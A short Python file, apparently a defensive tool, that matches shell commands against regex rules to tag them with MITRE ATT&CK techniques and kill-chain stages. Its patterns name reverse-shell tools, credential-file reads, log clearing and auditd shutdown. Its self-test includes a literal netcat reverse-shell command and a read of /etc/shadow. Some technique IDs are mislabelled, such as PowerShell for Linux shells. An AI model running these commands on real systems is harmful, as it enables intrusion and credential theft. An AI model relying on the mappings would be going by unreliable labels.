#!/usr/bin/env python3
# ShadowNet — MITRE ATT&CK mapper.
# Сопоставляет команды/поведение атакующего с TTPs и убийственной цепочкой.
import re

# (regex, technique_id, name, killchain_stage)
RULES: list[tuple[re.Pattern, str, str, str]] = [
    (re.compile(r"(?i)^(nmap|masscan|hping3|nc .*-z|ping .*-c)"), "T1046", "Network Service Scanning", "Reconnaissance"),
    (re.compile(r"(?i)wget|curl|nc |scp |rsync |base64 -d|/dev/tcp"), "T1105", "Ingress Tool Transfer", "Delivery"),
    (re.compile(r"(?i)find .*-perm.*(-4000|-2|/u=s)|chmod u\+s|pkexec"), "T1548.001", "Setuid and Setgid", "Privilege Escalation"),
    (re.compile(r"(?i)sudo -l|sudo su|su -"), "T1548.003", "Sudo and Sudo Caching", "Privilege Escalation"),
    (re.compile(r"(?i)cat /etc/shadow|cat /etc/passwd|getent passwd|unshadow"), "T1082", "System Information Discovery", "Discovery"),
    (re.compile(r"(?i)crontab -l|cat /etc/cron|systemctl list-timers"), "T1053.003", "Cron", "Persistence"),
    (re.compile(r"(?i)ssh-keygen|cat .*authorized_keys"), "T1098.004", "SSH Authorized Keys", "Persistence"),
    (re.compile(r"(?i)iptables|nft |ufw|firewall-cmd"), "T1562.004", "Disable System Firewall", "Defense Evasion"),
    (re.compile(r"(?i)history -c|unset HISTFILE|rm -rf .*\.log|kill -9 .*auditd|service auditd stop"), "T1070.003", "Clear Command History", "Defense Evasion"),
    (re.compile(r"(?i)ps aux|top -b|ss -tunap|netstat -tunap|lsof -i"), "T1057", "Process Discovery", "Discovery"),
    (re.compile(r"(?i)python3? -c|perl -e|bash -i|sh -c.*base64"), "T1059.001", "PowerShell/Linux Command Shell", "Execution"),
    (re.compile(r"(?i)mount|nsenter|docker exec|unshare"), "T1611", "Escape to Host", "Privilege Escalation"),
    (re.compile(r"(?i)dd if=/dev/mem|insmod|modprobe"), "T1547.006", "Kernel Modules", "Persistence"),
]


class MITREMapper:
    def __init__(self):
        self._hit: dict[str, int] = {}

    def classify(self, command: str) -> str | None:
        """Возвращает technique_id (например 'T1059.001') или None."""
        for rx, ttp, name, stage in RULES:
            if rx.search(command):
                self._hit[ttp] = self._hit.get(ttp, 0) + 1
                return ttp
        return None

    def stats(self) -> dict[str, int]:
        return dict(self._hit)


# Self-test
if __name__ == "__main__":
    m = MITREMapper()
    for c in ["whoami", "sudo -l", "find / -perm -4000 2>/dev/null", "cat /etc/shadow", "nc 10.0.0.5 4444 -e /bin/sh"]:
        print(c, "->", m.classify(c))
